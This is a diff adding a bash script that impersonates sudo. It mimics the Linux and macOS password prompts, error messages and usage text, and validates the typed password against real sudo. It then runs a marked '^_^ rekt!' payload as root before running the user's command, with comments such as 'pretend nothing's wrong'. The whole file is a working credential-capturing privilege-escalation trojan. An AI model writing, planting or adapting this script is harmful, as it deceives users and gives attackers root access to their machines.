@@ -1,0 +1,61 @@
+function testpass {
+OS=$(uname)
+if [ $OS = 'Linux' ]
+then
+read -sp "[sudo] password for $USER: " line
+printf "\n"
+exec echo $line | sudo -kS echo "hi" > /dev/null 2>&1
+res=$?
+return $res
+elif [ $OS = 'Darwin' ]
+then
+read -sp "Password:" line
+printf "\n"
+echo $line | sudo -kS echo "hi" > /dev/null 2>&1  
+res=$?
+return $res
+fi
+}
+
+if [ $# -gt 0 ]
+then
+OS=$(uname)
+sudo -n echo "hi" > /dev/null 2>&1 #has the user recently sudo'd? If so, no need for the rest.
+if [ $? != 0 ]
+then
+i=0
+testpass
+if [ $? != 0 ]
+then
+while [ $i -lt 2 ] 
+do
+i=$((i+1))
+printf 'Sorry, try again.\n'
+testpass
+if [ $? = 0 ]
+then
+exec echo $line | sudo -S echo "hi" > /dev/null 2>&1
+sudo -n echo "^_^ rekt!"
+sudo -n $@
+exit
+fi
+done
+i=$((i+1))
+echo "sudo: $i incorrect password attempts"
+else
+exec echo $line | sudo -S echo "^_^ rekt!" > /dev/null 2>&1
+sudo -n echo "^_^ rekt"
+sudo -n $@ #pretend nothing's wrong
+fi
+else
+sudo -n echo "^_^ rekt!" #payload
+sudo -n $@
+fi
+else
+echo "usage: sudo -h | -K | -k | -V"
+echo "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]"
+echo "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]"
+echo "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]"
+echo "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ..."
+fi
+
